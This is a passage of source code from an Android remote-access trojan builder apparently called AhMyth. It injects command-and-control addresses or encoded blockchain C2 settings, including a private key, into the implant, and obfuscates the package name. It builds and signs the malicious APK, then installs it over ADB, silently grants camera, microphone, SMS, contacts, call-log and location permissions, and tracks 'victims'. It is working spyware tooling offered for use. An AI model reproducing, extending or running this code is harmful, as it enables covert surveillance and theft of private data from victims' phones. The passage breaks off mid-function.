            if (!fs.existsSync(deployScriptPath)) {
                deployScriptPath = path.join(projectRoot, 'deploy-contract-only.js'); // Fallback
            }

            await exec(`node ${deployScriptPath}`, {
                cwd: projectRoot,
                env: { ...process.env, BLOCKCHAIN_RPC_URL: rpcToUse, BLOCKCHAIN_PRIVATE_KEY: opKey }
            });
            const contractEnv = parseEnvFile(blockchainContractEnvPath);
            if (contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS) {
                $appCtrl.blockchainC2Contract = contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS;
                $appCtrl.blockchainContract = contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS;
                $scope.$applyAsync();
                $appCtrl.Log(`[✓] Contract deployed: ${$appCtrl.blockchainC2Contract}`, CONSTANTS.logStatus.SUCCESS);
            } else {
                $appCtrl.Log('[✗] Contract deployment completed but address not found in env file', CONSTANTS.logStatus.FAIL);
            }
        } catch (e) {
            $appCtrl.Log(`[✗] Contract deploy failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };
    
    $appCtrl.runRpcSmokeTest = async () => {
        try {
            const { provider, rpcUrl, chain } = await getUiRpcProvider();
            if (chain === 'evm') {
                const block = await provider.getBlockNumber();
                $appCtrl.Log(`[✓] RPC OK (${rpcUrl}) - latest block ${block}`, CONSTANTS.logStatus.SUCCESS);
            } else {
                const { blockhash, lastValidBlockHeight } = await provider.getLatestBlockhash('confirmed');
                $appCtrl.Log(`[✓] RPC OK (${rpcUrl}) - blockhash ${blockhash.slice(0, 12)}... height ${lastValidBlockHeight}`, CONSTANTS.logStatus.SUCCESS);
            }
        } catch (e) {
            $appCtrl.Log(`[✗] RPC test failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };
    
    updateBlockchainAddresses();
    $appCtrl.loadBlockchainKeys();
    $scope.$watch('blockchainChain', () => updateBlockchainAddresses());

    // Permissions/Features selection
    $appCtrl.permissions = {
        camera: false,
        storage: false,
        microphone: false,
        location: false,
        contacts: false,
        sms: false,
        callLogs: false,
        wifi: true,
        accounts: false,
        phoneCall: false,
        screenCapture: false,
        notifications: false,
        clipboard: false,
        apps: false,
        browser: false,
        usageStats: false
    };

    // Select all permissions
    $appCtrl.selectAllPermissions = () => {
        Object.keys($appCtrl.permissions).forEach(key => {
            $appCtrl.permissions[key] = true;
        });
    };

    // Deselect all permissions
    $appCtrl.deselectAllPermissions = () => {
        Object.keys($appCtrl.permissions).forEach(key => {
            $appCtrl.permissions[key] = false;
        });
    };

    // Get count of selected permissions
    $appCtrl.getSelectedPermissionsCount = () => {
        return Object.values($appCtrl.permissions).filter(v => v === true).length;
    };

    // Format date for display
    $appCtrl.formatDate = (date) => {
        if (!date) return '';
        const d = new Date(date);
        const now = new Date();
        const diff = now - d;
        
        if (diff < 60000) return 'Just now';
        if (diff < 3600000) return Math.floor(diff / 60000) + ' min ago';
        if (diff < 86400000) return Math.floor(diff / 3600000) + ' hours ago';
        if (diff < 604800000) return Math.floor(diff / 86400000) + ' days ago';
        
        return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    };

    // Obfuscation preview
    $appCtrl.previewPackage = '';
    $appCtrl.previewAppName = '';

    // Load obfuscator
    const APKObfuscator = require('./assets/js/obfuscator.js');
    const obfuscator = new APKObfuscator();

    // Generate preview names
    $appCtrl.regeneratePreview = () => {
        $appCtrl.previewPackage = $appCtrl.obfuscationOptions.customPackage || obfuscator.generatePackageName();
        $appCtrl.previewAppName = $appCtrl.obfuscationOptions.customAppName || obfuscator.generateAppName();
        if (!$appCtrl.$$phase) {
            $appCtrl.$apply();
        }
    };

    // Helper: delayed logging to keep console/messages ordered without blocking
    function delayedLog(message, status = CONSTANTS.logStatus.INFO, delayMs = 0) {
        setTimeout(() => $appCtrl.Log(message, status), delayMs);
    }

    // Helper: persist errors to log files (used by APK builder)
    function writeErrorLog(error, fileName = 'error.log') {
        try {
            fs.ensureDirSync(logPath);
            const target = path.join(logPath, fileName);
            const content = (error && error.stack) ? error.stack : String(error || 'Unknown error');
            fs.writeFileSync(target, content, 'utf8');
        } catch (e) {
            console.error('[AhMyth] Failed to write error log:', e);
        }
    }

    // Locate IOSocket.smali inside Factory/Ahmyth (handles smali, smali_classes2, smali_classes3)
    async function findIOSocketSmali() {
        const factoryPath = path.resolve(__dirname, '..', 'Factory');
        const ahmythPath = path.join(factoryPath, 'Ahmyth');
        const candidates = [
            path.join(ahmythPath, 'smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
            path.join(ahmythPath, 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
            path.join(ahmythPath, 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali')
        ];
        for (const p of candidates) {
            if (fs.existsSync(p)) return { file: p, factoryPath, ahmythPath };
        }
        // fallback recursive search
        const search = require('glob').sync(path.join(ahmythPath, '**', 'IOSocket.smali'));
        if (search && search.length > 0) {
            return { file: search[0], factoryPath, ahmythPath };
        }
        throw new Error('IOSocket.smali not found in Factory/Ahmyth');
    }

    // Update IOSocket for TCP/IP
    async function updateIOSocketTcp(ioPath, ip, port) {
        const content = fs.readFileSync(ioPath, 'utf8');
        const pattern = /http:\/\/[^"\s]+:\d+/;
        const replaced = content.replace(pattern, `http://${ip}:${port}`);
        fs.writeFileSync(ioPath, replaced, 'utf8');
    }

    // Update IOSocket for Blockchain (encode config into placeholder)
    async function updateIOSocketBlockchain(ioPath, config) {
        const content = fs.readFileSync(ioPath, 'utf8');
        const cfg = {
            type: 'blockchain',
            rpcUrl: config.rpcUrl,
            contractAddress: config.contract,
            aesKey: config.aesKey,
            clientPrivateKey: config.clientKey,
            chain: config.chain || 'solana'
        };
        const marker = `BLOCKCHAIN_C2_CONFIG:${Buffer.from(JSON.stringify(cfg)).toString('base64')}`;

        // Try several patterns (inline URL, urlTemplate with ?model)
        let updated = content;
        const patterns = [
            /const-string\s+v\d+,\s*"http:\/\/[^"]+\?model="/,
            /http:\/\/[^"\s]+:\d+/,
            /BLOCKCHAIN_C2_CONFIG:[A-Za-z0-9+/=]+/
        ];
        let replaced = false;
        for (const p of patterns) {
            if (p.test(updated)) {
                updated = updated.replace(p, (m) => {
                    if (m.includes('?model=')) return m.replace(/http:\/\/[^"]+/, marker);
                    return marker;
                });
                replaced = true;
                break;
            }
        }
        if (!replaced) {
            throw new Error('Could not inject blockchain config into IOSocket.smali');
        }
        fs.writeFileSync(ioPath, updated, 'utf8');
    }

    // Build APK with connection-specific config (TCP or Blockchain)
    $appCtrl.Build = async (ip, port, connectionType, rpcUrl, contract, blockStep, candidates, aesKey, clientKey, chain) => {
        try {
            console.log('\n[APK Builder] ========================================');
            console.log('[APK Builder] Starting APK build process...');
            console.log(`[APK Builder] Connection type: ${connectionType}`);
            delayedLog('[→] Preparing build...', CONSTANTS.logStatus.INFO);
            
            // Get factory path first
            const { file: ioPath, factoryPath } = await findIOSocketSmali();
            
            // Auto-update Factory source from latest client build
            console.log('[APK Builder] Updating Factory source from latest client build...');
            delayedLog('[→] Updating Factory source from latest client build...', CONSTANTS.logStatus.INFO);
            const updateSourceScript = path.join(factoryPath, 'update-source.ps1');
            if (fs.existsSync(updateSourceScript)) {
                try {
                    // Use PowerShell to run the script
                    const psCommand = `powershell -ExecutionPolicy Bypass -File "${updateSourceScript}"`;
                    console.log('[APK Builder] Building client APK and updating Factory source...');
                    console.log('[APK Builder] This may take a few minutes...');
                    delayedLog('[→] Building client APK and updating Factory source...', CONSTANTS.logStatus.INFO);
                    delayedLog('[ℹ] This may take a few minutes...', CONSTANTS.logStatus.INFO);
                    
                    const result = await exec(psCommand, { 
                        cwd: factoryPath,
                        maxBuffer: 10 * 1024 * 1024, // 10MB buffer for build output
                        timeout: 600000 // 10 minute timeout for build
                    });
                    
                    // Log output to console and GUI
                    const allOutput = (result.stdout || '').toString();
                    if (allOutput) {
                        const outputLines = allOutput.split('\n').filter(l => l.trim());
                        if (outputLines.length > 0) {
                            // Log all output to console
                            console.log('[APK Builder] Build output:');
                            outputLines.forEach(line => {
                                if (line.length > 0 && !line.includes('Profile loaded')) {
                                    console.log(`  ${line}`);
                                }
                            });
                            
                            // Show last few lines in GUI
                            const lastLines = outputLines.slice(-5);
                            lastLines.forEach(line => {
                                const lowerLine = line.toLowerCase();
                                if (lowerLine.includes('error') || lowerLine.includes('failed') || lowerLine.includes('exception')) {
                                    delayedLog(`[⚠] ${line.substring(0, 300)}`, CONSTANTS.logStatus.WARNING);
                                } else if (lowerLine.includes('success') || lowerLine.includes('done') || lowerLine.includes('updated')) {
                                    delayedLog(`[✓] ${line.substring(0, 300)}`, CONSTANTS.logStatus.SUCCESS);
                                } else if (lowerLine.includes('building') || lowerLine.includes('decompiling')) {
                                    delayedLog(`[ℹ] ${line.substring(0, 300)}`, CONSTANTS.logStatus.INFO);
                                }
                            });
                        }
                    }
                    
                    console.log('[APK Builder] ✓ Factory source updated successfully');
                    delayedLog('[✓] Factory source updated successfully', CONSTANTS.logStatus.SUCCESS);
                } catch (updateErr) {
                    // Check if the error output actually contains success indicators
                    // PowerShell Write-Host with colors can output to stderr, causing false errors
                    const errorOutput = (updateErr.stdout || updateErr.stderr || '').toString();
                    const errorOutputLower = errorOutput.toLowerCase();
                    
                    // Check for success indicators in the output
                    const hasSuccess = errorOutputLower.includes('build successful') ||
                                     errorOutputLower.includes('decompilation successful') ||
                                     errorOutputLower.includes('factory source updated successfully') ||
                                     errorOutputLower.includes('done! the electron gui builder');
                    
                    if (hasSuccess) {
                        // Script actually succeeded, just had output to stderr (colored output)
                        console.log('[APK Builder] Build completed successfully (stderr output detected but script succeeded)');
                        const outputLines = errorOutput.split('\n').filter(l => l.trim() && !l.includes('Profile loaded'));
                        if (outputLines.length > 0) {
                            console.log('[APK Builder] Build output:');
                            outputLines.forEach(line => {
                                if (line.length > 0) {
                                    console.log(`  ${line}`);
                                }
                            });
                            
                            // Show success messages in GUI
                            const successLines = outputLines.filter(l => {
                                const lower = l.toLowerCase();
                                return lower.includes('success') || lower.includes('done') || lower.includes('updated');
                            });
                            successLines.slice(-3).forEach(line => {
                                delayedLog(`[✓] ${line.substring(0, 300)}`, CONSTANTS.logStatus.SUCCESS);
                            });
                        }
                        console.log('[APK Builder] ✓ Factory source updated successfully');
                        delayedLog('[✓] Factory source updated successfully', CONSTANTS.logStatus.SUCCESS);
                    } else {
                        // Actual error occurred
                        const errorMsg = updateErr.message || String(updateErr);
                        console.error('[APK Builder] ✗ Failed to update Factory source:', errorMsg);
                        delayedLog(`[✗] Failed to update Factory source: ${errorMsg}`, CONSTANTS.logStatus.FAIL);
                        if (errorOutput) {
                            const errorLines = errorOutput.split('\n').filter(l => l.trim() && !l.includes('Profile loaded')).slice(-15);
                            if (errorLines.length > 0) {
                                console.error('[APK Builder] Error details (last 15 lines):');
                                errorLines.forEach(line => {
                                    if (line.length > 0) {
                                        console.error(`  ${line}`);
                                    }
                                });
                                delayedLog(`[ℹ] Error details (last 15 lines):`, CONSTANTS.logStatus.WARNING);
                                errorLines.forEach(line => {
                                    if (line.length > 0) {
                                        delayedLog(`    ${line.substring(0, 250)}`, CONSTANTS.logStatus.WARNING);
                                    }
                                });
                            }
                        }
                        console.log('[APK Builder] Continuing with existing Factory source...');
                        delayedLog('[ℹ] Continuing with existing Factory source...', CONSTANTS.logStatus.INFO);
                    }
                    // Continue with existing source - don't fail the build
                }
            } else {
                console.warn('[APK Builder] ⚠ update-source.ps1 not found, using existing Factory source');
                delayedLog('[⚠] update-source.ps1 not found, using existing Factory source', CONSTANTS.logStatus.WARNING);
            }

            // Ensure versionCode/versionName are bumped to avoid INSTALL_FAILED_VERSION_DOWNGRADE
            const manifestPath = path.join(factoryPath, 'Ahmyth', 'AndroidManifest.xml');
            if (fs.existsSync(manifestPath)) {
                try {
                    let manifest = fs.readFileSync(manifestPath, 'utf8');
                    // Set a high versionCode and clear versionName to a date-based name
                    const newVersionCode = Math.floor(Date.now() / 1000); // seconds since epoch
                    const newVersionName = `2.9.${newVersionCode}`;
                    manifest = manifest
                        .replace(/android:versionCode="[^"]*"/, `android:versionCode="${newVersionCode}"`)
                        .replace(/android:versionName="[^"]*"/, `android:versionName="${newVersionName}"`);
                    fs.writeFileSync(manifestPath, manifest, 'utf8');
                    console.log(`[APK Builder] Bumped versionCode to ${newVersionCode}`);
                    delayedLog(`[→] Bumped versionCode to ${newVersionCode}`, CONSTANTS.logStatus.INFO);
                } catch (e) {
                    console.warn(`[APK Builder] Could not bump versionCode: ${e.message}`);
                    delayedLog(`[⚠] Could not bump versionCode: ${e.message}`, CONSTANTS.logStatus.WARNING);
                }
            }

            if (connectionType === 'blockchain') {
                console.log('[APK Builder] Injecting blockchain C2 config...');
                delayedLog('[→] Injecting blockchain C2 config...', CONSTANTS.logStatus.INFO);
                if (!rpcUrl || !contract || !aesKey || !clientKey) {
                    throw new Error('Missing blockchain settings (RPC URL, contract/channel, AES key, client key)');
                }
                await updateIOSocketBlockchain(ioPath, {
                    rpcUrl,
                    contract,
                    aesKey,
                    clientKey,
                    chain
                });
            } else {
                console.log('[APK Builder] Injecting TCP/IP config...');
                delayedLog('[→] Injecting TCP/IP config...', CONSTANTS.logStatus.INFO);
                await updateIOSocketTcp(ioPath, ip, port);
            }

            const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T');
            const ts = `${timestamp[0]}-${timestamp[1]}`;
            const outApk = `Ahmyth-${ts}.apk`;
            const signedApk = `Ahmyth-${ts}-aligned-debugSigned.apk`;

            // Build
            console.log('[APK Builder] Building APK with apktool...');
            delayedLog('[→] Building APK...', CONSTANTS.logStatus.INFO);
            const buildResult = await exec(`java -jar apktool.jar b Ahmyth -o "${outApk}"`, { cwd: path.join(factoryPath) });
            if (buildResult.stdout) {
                console.log('[APK Builder] Build output:', buildResult.stdout);
            }

            // Sign
            console.log('[APK Builder] Signing APK...');
            delayedLog('[→] Signing APK...', CONSTANTS.logStatus.INFO);
            const signResult = await exec(`java -jar sign.jar -a "${outApk}"`, { cwd: path.join(factoryPath) });
            if (signResult.stdout) {
                console.log('[APK Builder] Sign output:', signResult.stdout);
            }

            // Copy APK to output folder so it shows in the payloads list
            const builtApkPath = path.join(factoryPath, signedApk);
            const finalApkPath = path.join(outputPath, signedApk);
            
            try {
                // Ensure output directory exists
                if (!fs.existsSync(outputPath)) {
                    fs.mkdirpSync(outputPath);
                }
                fs.copyFileSync(builtApkPath, finalApkPath);
                console.log(`[APK Builder] ✓ APK copied to output folder`);
                delayedLog(`[✓] APK copied to output folder`, CONSTANTS.logStatus.SUCCESS);
            } catch (copyErr) {
                console.warn(`[APK Builder] ⚠ Could not copy APK to output folder: ${copyErr.message}`);
                delayedLog(`[⚠] Could not copy APK to output folder: ${copyErr.message}`, CONSTANTS.logStatus.WARNING);
            }
            
            // Store last built path (use output folder path)
            $appCtrl.lastBuiltApkPath = finalApkPath;
            console.log(`[APK Builder] ✓ APK built successfully: ${signedApk}`);
            console.log(`[APK Builder] Location: ${finalApkPath}`);
            delayedLog(`[✓] APK built: ${signedApk}`, CONSTANTS.logStatus.SUCCESS);
            delayedLog(`[ℹ] Location: ${finalApkPath}`, CONSTANTS.logStatus.INFO);
            
            // Refresh payloads list
            $appCtrl.refreshPayloads();

            if (!$appCtrl.$$phase) $appCtrl.$applyAsync();
        } catch (e) {
            $appCtrl.Log(`[✗] Build failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
            writeErrorLog(e, 'build.log');
        }
    };
    
    // Initialize preview
    setTimeout(() => {
        $appCtrl.regeneratePreview();
    }, 500);

    $appCtrl.logs = [];
    $appCtrl.isListen = false;

    // Get victim count
    $appCtrl.getVictimCount = () => {
        return Object.keys(viclist).length;
    };

    // Get online victim count
    $appCtrl.getOnlineCount = () => {
        const values = Object.values(viclist || {});
        return values.filter(v => v && v.isOnline !== false).length;
    };

    // Get offline victim count
    $appCtrl.getOfflineCount = () => {
        return Object.values(viclist).filter(v => v.isOnline === false).length;
    };

    // Format last seen time
    $appCtrl.formatLastSeen = (timestamp) => {
        if (!timestamp) return 'Unknown';
        const diff = Date.now() - timestamp;
        if (diff < 60000) return 'Just now';
        if (diff < 3600000) return Math.floor(diff / 60000) + ' min ago';
        if (diff < 86400000) return Math.floor(diff / 3600000) + ' hours ago';
        return Math.floor(diff / 86400000) + ' days ago';
    };

    // Payload management
    $appCtrl.refreshPayloads = () => {
        try {
            const payloads = [];
            const seenNames = new Set();
            
            // Check output folder (~/AhMyth/Output)
            if (fs.existsSync(outputPath)) {
                const files = fs.readdirSync(outputPath).filter(f => f.endsWith('.apk'));
                files.forEach(f => {
                    if (!seenNames.has(f)) {
                        seenNames.add(f);
                        const stats = fs.statSync(path.join(outputPath, f));
                        payloads.push({
                            name: f,
                            path: path.join(outputPath, f),
                            size: (stats.size / 1024 / 1024).toFixed(2) + ' MB',
                            date: stats.mtime
                        });
                    }
                });
            }
            
            // Also check Factory folder for APKs built there
            const factoryPath = path.resolve(__dirname, '..', 'Factory');
            if (fs.existsSync(factoryPath)) {
                const files = fs.readdirSync(factoryPath).filter(f => f.endsWith('.apk') && f.includes('Signed'));
                files.forEach(f => {
                    if (!seenNames.has(f)) {
                        seenNames.add(f);
                        const stats = fs.statSync(path.join(factoryPath, f));
                        payloads.push({
                            name: f,
                            path: path.join(factoryPath, f),
                            size: (stats.size / 1024 / 1024).toFixed(2) + ' MB',
                            date: stats.mtime
                        });
                    }
                });
            }
            
            $appCtrl.builtPayloads = payloads.sort((a, b) => b.date - a.date);
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        } catch (e) {
            console.error('Error refreshing payloads:', e);
        }
    };

    // Copy payload path to clipboard
    $appCtrl.copyPayloadPath = (payload) => {
        if (payload && payload.path) {
            require('electron').clipboard.writeText(payload.path);
            $appCtrl.Log('[✓] Path copied to clipboard', CONSTANTS.logStatus.SUCCESS);
        }
    };

    // Get connected ADB device (prioritizes emulators over real devices)
    $appCtrl.getConnectedDevice = () => {
        return new Promise((resolve, reject) => {
            const adbPorts = [5037, 5038, 5039, 5040, 5041];
            const allDevices = []; // Collect all devices from all ports
            
            // Helper to check if device ID looks like an emulator
            const isEmulator = (deviceId) => {
                return deviceId.startsWith('emulator-') || 
                       deviceId.match(/^127\.0\.0\.1:\d+$/) ||
                       deviceId.match(/^localhost:\d+$/) ||
                       deviceId.match(/^10\.0\.2\.\d+:\d+$/);
            };
            
            const tryPort = (portIndex) => {
                if (portIndex >= adbPorts.length) {
                    // All ports checked - now select best device
                    if (allDevices.length === 0) {
                        reject(new Error('No ADB device found. Make sure a device/emulator is connected and ADB is running.'));
                        return;
                    }
                    
                    // Sort devices: emulators first, then real devices
                    allDevices.sort((a, b) => {
                        const aIsEmulator = isEmulator(a.deviceId);
                        const bIsEmulator = isEmulator(b.deviceId);
                        if (aIsEmulator && !bIsEmulator) return -1;
                        if (!aIsEmulator && bIsEmulator) return 1;
                        return 0;
                    });
                    
                    const selected = allDevices[0];
                    const deviceType = isEmulator(selected.deviceId) ? 'emulator' : 'physical device';
                    console.log(`[ADB] Selected ${deviceType}: ${selected.deviceId} (from ${allDevices.length} available)`);
                    resolve(selected);
                    return;
                }
                
                const port = adbPorts[portIndex];
                execCallback(`adb -P ${port} devices`, { timeout: 5000 }, (err, stdout) => {
                    if (!err && stdout) {
                        const lines = stdout.split('\n').filter(l => l.trim() && !l.includes('List of devices'));
                        for (const line of lines) {
                            const match = line.match(/^(\S+)\s+(device|emulator)/);
                            if (match) {
                                allDevices.push({ deviceId: match[1], adbPort: port });
                            }
                        }
                    }
                    tryPort(portIndex + 1);
                });
            };
            
            tryPort(0);
        });
    };

    // Install APK on connected device (and run it)
    $appCtrl.installApk = async (apkPath) => {
        if (!apkPath) {
            $appCtrl.Log('[✗] No APK path provided', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        if (!fs.existsSync(apkPath)) {
            $appCtrl.Log(`[✗] APK not found: ${apkPath}`, CONSTANTS.logStatus.FAIL);
            return;
        }
        
        $appCtrl.Log(`[→] Installing APK: ${path.basename(apkPath)}...`, CONSTANTS.logStatus.INFO);
        
        try {
            const { deviceId, adbPort } = await $appCtrl.getConnectedDevice();
            const isEmulator = deviceId.startsWith('emulator-') || 
                               deviceId.match(/^127\.0\.0\.1:\d+$/) ||
                               deviceId.match(/^localhost:\d+$/) ||
                               deviceId.match(/^10\.0\.2\.\d+:\d+$/);
            const deviceType = isEmulator ? '📱 Emulator' : '📲 Physical device';
            $appCtrl.Log(`[ℹ] Found ${deviceType}: ${deviceId} (ADB port ${adbPort})`, CONSTANTS.logStatus.INFO);
            
            // Uninstall old version first (ignore errors)
            $appCtrl.Log('[→] Uninstalling previous version...', CONSTANTS.logStatus.INFO);
            await new Promise(resolve => {
                execCallback(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, { timeout: 10000 }, () => resolve());
            });
            
            // Install with downgrade flag
            $appCtrl.Log('[→] Installing APK...', CONSTANTS.logStatus.INFO);
            const installCmd = `adb -P ${adbPort} -s ${deviceId} install --no-incremental -r -d "${apkPath}"`;
            
            await new Promise((resolve, reject) => {
                execCallback(installCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                    if (err) {
                        reject(new Error(`Install failed: ${err.message}`));
                        return;
                    }
                    resolve();
                });
            });
            
            $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
            
            // Grant permissions
            $appCtrl.Log('[→] Granting permissions...', CONSTANTS.logStatus.INFO);
            const permissions = [
                'android.permission.CAMERA',
                'android.permission.RECORD_AUDIO',
                'android.permission.READ_CONTACTS',
                'android.permission.READ_SMS',
                'android.permission.READ_CALL_LOG',
                'android.permission.ACCESS_FINE_LOCATION',
                'android.permission.READ_EXTERNAL_STORAGE',
                'android.permission.WRITE_EXTERNAL_STORAGE'
            ];
            
            for (const perm of permissions) {
                await new Promise(resolve => {
                    execCallback(`adb -P ${adbPort} -s ${deviceId} shell pm grant ahmyth.mine.king.ahmyth ${perm}`, { timeout: 5000 }, () => resolve());
                });
            }
            $appCtrl.Log('[✓] Permissions granted', CONSTANTS.logStatus.SUCCESS);
            
            // Launch the app
            $appCtrl.Log('[→] Launching app...', CONSTANTS.logStatus.INFO);
            await new Promise((resolve) => {
                execCallback(`adb -P ${adbPort} -s ${deviceId} shell am start -n ahmyth.mine.king.ahmyth/.MainActivity`, { timeout: 10000 }, (err) => {
                    if (err) {
                        // Try alternative launch method
                        execCallback(`adb -P ${adbPort} -s ${deviceId} shell monkey -p ahmyth.mine.king.ahmyth -c android.intent.category.LAUNCHER 1`, { timeout: 10000 }, () => resolve());
                    } else {
                        resolve();
                    }
                });
            });
            
            $appCtrl.Log('[✓] App launched successfully!', CONSTANTS.logStatus.SUCCESS);
            $appCtrl.Log('[ℹ] Waiting for device to connect...', CONSTANTS.logStatus.INFO);
            
        } catch (e) {
            $appCtrl.Log(`[✗] ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
        
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };

    // Install and run the last built APK
    $appCtrl.installAndRun = async () => {
        if (!$appCtrl.lastBuiltApkPath) {
            $appCtrl.Log('[✗] No APK has been built yet', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        if (!fs.existsSync($appCtrl.lastBuiltApkPath)) {
            $appCtrl.Log(`[✗] APK not found: ${$appCtrl.lastBuiltApkPath}`, CONSTANTS.logStatus.FAIL);
            return;
        }
        
        $appCtrl.Log(`[→] Installing and running: ${path.basename($appCtrl.lastBuiltApkPath)}...`, CONSTANTS.logStatus.INFO);
        
        try {
            const { deviceId, adbPort } = await $appCtrl.getConnectedDevice();
            const isEmulator = deviceId.startsWith('emulator-') || 
                               deviceId.match(/^127\.0\.0\.1:\d+$/) ||
                               deviceId.match(/^localhost:\d+$/) ||
                               deviceId.match(/^10\.0\.2\.\d+:\d+$/);
            const deviceType = isEmulator ? '📱 Emulator' : '📲 Physical device';
            $appCtrl.Log(`[ℹ] Found ${deviceType}: ${deviceId} (ADB port ${adbPort})`, CONSTANTS.logStatus.INFO);
            
            // Uninstall old version first (ignore errors)
            $appCtrl.Log('[→] Uninstalling previous version...', CONSTANTS.logStatus.INFO);
            await new Promise(resolve => {
                execCallback(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, { timeout: 10000 }, () => resolve());
            });
            
            // Install with downgrade flag
            $appCtrl.Log('[→] Installing APK...', CONSTANTS.logStatus.INFO);
            const installCmd = `adb -P ${adbPort} -s ${deviceId} install --no-incremental -r -d "${$appCtrl.lastBuiltApkPath}"`;
            
            await new Promise((resolve, reject) => {
                execCallback(installCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                    if (err) {
                        reject(new Error(`Install failed: ${err.message}`));
                        return;
                    }
                    resolve();
                });
            });
            
            $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
            
            // Grant permissions
            $appCtrl.Log('[→] Granting permissions...', CONSTANTS.logStatus.INFO);
            const permissions = [
                'android.permission.CAMERA',
                'android.permission.RECORD_AUDIO',
                'android.permission.READ_CONTACTS',
                'android.permission.READ_SMS',
                'android.permission.READ_CALL_LOG',
                'android.permission.ACCESS_FINE_LOCATION',
                'android.permission.READ_EXTERNAL_STORAGE',
                'android.permission.WRITE_EXTERNAL_STORAGE'
            ];
            
            for (const perm of permissions) {
                await new Promise(resolve => {
                    execCallback(`adb -P ${adbPort} -s ${deviceId} shell pm grant ahmyth.mine.king.ahmyth ${perm}`, { timeout: 5000 }, () => resolve());
                });
            }
            $appCtrl.Log('[✓] Permissions granted', CONSTANTS.logStatus.SUCCESS);
            
            // Launch the app
            $appCtrl.Log('[→] Launching app...', CONSTANTS.logStatus.INFO);
            await new Promise((resolve, reject) => {
                execCallback(`adb -P ${adbPort} -s ${deviceId} shell am start -n ahmyth.mine.king.ahmyth/.MainActivity`, { timeout: 10000 }, (err) => {
                    if (err) {
                        // Try alternative launch method
                        execCallback(`adb -P ${adbPort} -s ${deviceId} shell monkey -p ahmyth.mine.king.ahmyth -c android.intent.category.LAUNCHER 1`, { timeout: 10000 }, (err2) => {
                            if (err2) reject(new Error('Failed to launch app'));
                            else resolve();
                        });
                    } else {
                        resolve();
                    }
                });
            });
            
            $appCtrl.Log('[✓] App launched successfully!', CONSTANTS.logStatus.SUCCESS);
            $appCtrl.Log('[ℹ] Waiting for device to connect...', CONSTANTS.logStatus.INFO);
            
        } catch (e) {
            $appCtrl.Log(`[✗] ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
        
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };

    // Uninstall app from device
    $appCtrl.uninstallApp = async () => {
        $appCtrl.Log('[→] Uninstalling AhMyth from device...', CONSTANTS.logStatus.INFO);
        
        try {
            const { deviceId, adbPort } = await $appCtrl.getConnectedDevice();
            $appCtrl.Log(`[ℹ] Found device: ${deviceId}`, CONSTANTS.logStatus.INFO);
            
            execCallback(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, { timeout: 15000 }, (err, stdout) => {
                if (err || (stdout && stdout.includes('Failure'))) {
                    $appCtrl.Log('[ℹ] App was not installed or already uninstalled', CONSTANTS.logStatus.INFO);
                } else {
                    $appCtrl.Log('[✓] App uninstalled successfully', CONSTANTS.logStatus.SUCCESS);
                }
                if (!$appCtrl.$$phase) $appCtrl.$apply();
            });
        } catch (e) {
            $appCtrl.Log(`[✗] ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };

    // Delete a built APK
    $appCtrl.deletePayload = (payload) => {
        if (!payload || !payload.path) return;
        
        try {
            fs.unlinkSync(payload.path);
            $appCtrl.Log(`[✓] Deleted: ${payload.name}`, CONSTANTS.logStatus.SUCCESS);
            $appCtrl.refreshPayloads();
        } catch (e) {
            $appCtrl.Log(`[✗] Failed to delete: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };

    // Open folders
    $appCtrl.openOutputFolder = () => {
        if (shell) {
            shell.openPath(outputPath);
        }
    };

    $appCtrl.openDownloadsFolder = () => {
        if (shell) {
            shell.openPath(downloadsPath);
        }
    };

    // Initialize payloads list
    $appCtrl.refreshPayloads();

    // ========== TEST SUITE CONTROLLER ==========
    $appCtrl.testConfig = {
        deviceId: '',
        serverIP: '192.168.0.180',
        port: 1234,
        connectionType: 'tcp',               // tcp | blockchain
        blockchainChain: 'solana',           // solana | evm
        blockchainRpcUrl: '',                // filled below from app settings
        blockchainContract: '',              // filled below from app settings
        blockchainAesKey: '',                // optional AES key for C2
        autoBuild: true,
        forceRebuild: true,
        onlyFailing: false
    };
    // Initialize test config blockchain fields from current app settings
    $appCtrl.testConfig.blockchainRpcUrl = $appCtrl.blockchainRpcUrl || $appCtrl.blockchainC2RpcUrl || '';
    $appCtrl.testConfig.blockchainContract = $appCtrl.blockchainContract || $appCtrl.blockchainC2Contract || '';
    $appCtrl.testConfig.blockchainAesKey = $appCtrl.blockchainC2AesKey || '';
    
    $appCtrl.availableDevices = [];
    $appCtrl.isRunning = false;
    $appCtrl.outputLines = [];
    $appCtrl.testStats = {
        total: 0,
        passed: 0,
        failed: 0
    };
    $appCtrl.testResults = [];
    $appCtrl.testProcess = null;

    // Refresh ADB devices
    $appCtrl.refreshDevices = async () => {
        try {
            const { exec } = require('child_process');
            const { promisify } = require('util');
            const execAsync = promisify(exec);
            
            const { stdout } = await execAsync('adb devices');
            const lines = stdout.split('\n').filter(l => l.trim() && !l.includes('List of devices'));
            const devices = [];
            
            for (const line of lines) {
                const parts = line.trim().split(/\s+/);
